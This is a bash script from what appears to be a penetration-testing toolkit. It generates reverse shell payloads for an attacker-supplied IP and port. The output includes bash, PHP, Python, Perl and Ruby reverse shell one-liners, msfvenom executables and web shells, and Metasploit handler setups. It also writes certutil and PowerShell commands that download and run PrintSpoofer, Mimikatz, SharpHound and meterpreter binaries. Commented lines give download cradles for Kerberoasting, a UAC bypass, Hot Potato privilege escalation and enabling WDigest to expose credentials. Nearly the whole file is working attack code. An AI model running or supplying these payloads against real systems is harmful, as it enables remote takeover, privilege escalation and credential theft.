#!/usr/bin/env bash
# Jan-Karel Visser
# LGPLv3 licensed
# https://jan-karel.nl
# https://hacksec.nl

source meuk/globalmeuk.sh

localnic=${1:-}
localport=${2:-}
BESTAND=${3:-}


echo "[*] Incompentent Bastard v${VERSIE}"


if [ -z "$BESTAND" ]; then
  BESTAND='shell'
fi

if [ -z "$localnic" ]; then



  echo "Incompetent Bastard reverseshells.sh

Excessive handcrafted reverse shells with love and minimal care...

Generates some reverse shells, macro's and a txt file for some good ol copy paste.
Currently default's to port ${PORT} you. Change this by giving the port als a second option.
You'll find the generated shells and the textfile ${BESTAND}_${PORT} in the directory payloads.

usage (with port ${PORT}):
./reverseshell.sh eth0
or (with port 4444)
./reverseshell.sh eth0 4444
or (with IP)
./reverseshell.sh 127.0.1.2 4444
"

  echo "[!] You failed..."
  exit;
fi

if [ "$localport" == $RE ]; then
  PORT=$localport
fi


mkdir -p payloads/

#todo: move this to globalmeuk.sh
if [[ $localnic =~ ^[a-z](.*)$ ]]; then
  # we hebben een tun of eth?
  if [[ "$OSTYPE" == "darwin"* ]]; then
    IP=$(ip -4 addr list "$1" | grep inet |  awk '{print $2}' | cut -d/ -f1);
  else
    IP=$(/sbin/ip -o -4 addr list $localnic | awk '{print $4}' | cut -d/ -f1);
  fi
else
  # blijkbaar een IP
  IP=$localnic
fi


echo "[+] Take your time for some excessive handcrafted reverse shells with love and minimal care for ${IP} on port ${PORT}"
curl "http://127.0.0.1/dashboard/zet_ip/${IP}"
echo "[.] Now baking BASH reverse TCP shells..."
echo '# Incompetent Bastard' > http/payloads/${BESTAND}_${PORT}.txt
echo 'Excessive handcrafted reverse shells with love and minimal care.' >> http/payloads/${BESTAND}_${PORT}.txt
echo "# Bash TCP" >> http/payloads/${BESTAND}_${PORT}.txt
echo 'bash -i >& /dev/tcp/'${IP}'/'${PORT}' 0>&1' >> http/payloads/${BESTAND}_${PORT}.txt
echo "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1" > http/commands/bashtcp1
echo '0<&888;exec 888<>/dev/tcp/'${IP}'/'${PORT}'; sh <&888 >&888 2>&888' >> http/payloads/${BESTAND}_${PORT}.txt
echo "0<&888;exec 888<>/dev/tcp/${IP}/${PORT}; sh <&888 >&888 2>&888" > http/commands/bashtcp2
echo '/bin/bash -l > /dev/tcp/'${IP}'/'${PORT}' 0<&1 2>&1' >> http/payloads/${BESTAND}_${PORT}.txt
echo "/bin/bash -l > /dev/tcp/${IP}/${PORT} 0<&1 2>&1" > http/commands/bashtcp3
echo "[.] Now baking variants reverse TCP shells, like dash, sh etc..." 
echo '# UDP nc -u -lnvp ${PORT}\n\n' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'bash -i >& /dev/udp/'${IP}'/'${PORT}' 0>&1'  >> http/payloads/${BESTAND}_${PORT}.txt
echo "bash -i >& /dev/udp/${IP}/${PORT} 0>&1"  > http/commands/bashudp1
echo 'sh -i >& /dev/udp/'${IP}'/'${PORT}' 0>&1'  >> http/payloads/${BESTAND}_${PORT}.txt
echo "sh -i >& /dev/udp/${IP}/${PORT} 0>&1"  > http/commands/shudp1
echo '# PHP\n\n' >> http/payloads/${BESTAND}_${PORT}.txt
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '${IP}' '${PORT}' >/tmp/f");?>' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});\`/bin/sh -i <&3 >&3 2>&3\`;'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo '# PYTHON ' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"${IP}\",${PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'python -c '"'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"${IP}\",${PORT}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"''  >> http/payloads/${BESTAND}_${PORT}.txt

echo '# PERL' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'perl -e '"'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'perl -MIO -e '"'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'' >> http/payloads/${BESTAND}_${PORT}.txt

echo '# RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt

echo '# MSFVENOM' >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > http/payloads/${BESTAND}_${PORT}.exe
echo "${BESTAND}_${PORT}.exe :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/${BESTAND}_${PORT}.elf
echo "${BESTAND}_${PORT}.elf :: linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf " >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meterpreter_${PORT}.elf
echo "meterpreter_${PORT}.elf :: linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meter64_${PORT}.elf
echo "meter64_${PORT}.elf :: linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
echo "${BESTAND}_${PORT}.macho :: osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
echo "${BESTAND}_${PORT}.asp :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.jsp
echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war" >> http/payloads/${BESTAND}_${PORT}.txt
#msfvenom -p payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/tcp${BESTAND}_${PORT}.py
#echo "tcp${BESTAND}_${PORT}.py :: payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
#msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
#echo "meterpreter_${PORT}.php :: php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw " >> http/payloads/${BESTAND}_${PORT}.txt 
#msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf
#echo "${BESTAND}_reverse_tcp.elf :: platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b \x00" >> http/payloads/${BESTAND}_${PORT}.txt 



echo '# MSF handlers command.sh' >> http/payloads/${BESTAND}_${PORT}.txt
echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT 8080 \n run -j;" > http/commands/msfshell_tcp8080
echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msfshell_tcp
echo 'Payload windows/x64/meterpreter_https' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh metasploit msf_https8080' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh metasploit msf_https' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'Payload windows/x64/meterpreter_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh metasploit msf_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
echo 'Payload generic/shell_reverse_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh metasploit msfshell_tcp8080' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh metasploit msfshell_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
echo "[.] Building the prefered shells :)"
echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt


python3 powershell.py ${IP} ${PORT} windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt



echo '## PrinSpoofer64.exe ' >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
echo './command.sh [screenname] printspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspoofer
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/psprintspooferrun
echo './command.sh [screenname] psprintspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh [screenname] psprintspooferrun' >> http/payloads/${BESTAND}_${PORT}.txt

echo '## MimiKatz.exe' >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
echo './command.sh [screenname] mimikatz' >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
echo './command.sh [screenname] psmimikatz' >> http/payloads/${BESTAND}_${PORT}.txt

echo '## SharpHound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
echo './command.sh [screenname] sharphound' >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe --CollectionMethods All" > http/commands/pssharphoundrun
echo './command.sh [screenname] pssharphound' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh [screenname] pssharphoundrun' >> http/payloads/${BESTAND}_${PORT}.txt


echo "## windows/x64/meterpreter TCP  ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt


echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
echo './command.sh [screenname] certutilmeth' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh [screenname] psmethrun' >> http/payloads/${BESTAND}_${PORT}.txt

echo '## windows/x64/meterpreter TCP  8080' >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/payloads/meth8080.exe meth8080.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\tasks\meth8080.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe')" > http/commands/psmeth8080
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun8080run


echo "## windows/x64/reverse_tcp TCP ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
echo "certutil -urlcache -split -f http://${IP}/payloads/methtcp.exe methtcp.exe" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\tasks\methtcp.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe')" > http/commands/psmethtcp
echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\methtcp.exe" > http/commands/psmethtcprun
echo './command.sh [screenname] psmethtcp' >> http/payloads/${BESTAND}_${PORT}.txt
echo './command.sh [screenname] psmethtcprun' >> http/payloads/${BESTAND}_${PORT}.txt


















# Domain Recon
## ShareFinder - Look for shares on network and check access under current user context & Log to file
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

## Import PowerView Module
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

## Invoke-BloodHound for domain recon
#powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

## ADRecon script to generate XLSX file of domain properties
#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"


# Priv Esc
## PowerUp script
#powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

## cPasswords in sysvol
echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword \$env:logonserver\sysvol\*.xml" > http/commands/cpassword


## Inveigh
### Start inveigh using Basic Auth - logging to file
#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"

### Start inveigh in silent mode (no popups)
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"

## Invoke-HotPotato Exploit
#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"

## Bypass UAC and launch PowerShell window as admin
#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

## Invoke-Kerberoast with Hashcat Output
#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"


# Reg Keys
## Enable Wdigest
#reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f

## Check always install elevated
echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/commands/install_elevated


echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
python3 invoke-shellcode.py ${IP} ${PORT}


#echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0

echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
python3 meterpreter.py ${IP} ${PORT}
cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe

echo '#METERPRETER (reverse_https) on port 8080' >> http/payloads/${BESTAND}_${PORT}.txt
python3 meterpreter.py ${IP} 8080
cp meuk/meth/bin/Debug/meth.exe http/payloads/meth8080.exe


echo "[+] Generate METH reverse TCP payload for ${IP} on port ${PORT}"
python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe


echo "[+] Generate ASPX reverse HTTPS shell"
python3 methaspx.py ${IP} ${PORT}
cp http/payloads/meth.aspx http/payloads/meth_https.aspx
echo "[+] Generate ASPX reverse TCP shell"
python3 methaspx.py ${IP} ${PORT} windows/x64/shell_reverse_tcp



echo "[+] Building MACRO txt"
echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
python3 macro.py ${IP} ${PORT}
echo "[+] Done"
echo '[payloadsplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
#python3 payloads.py ${IP} ${PORT}


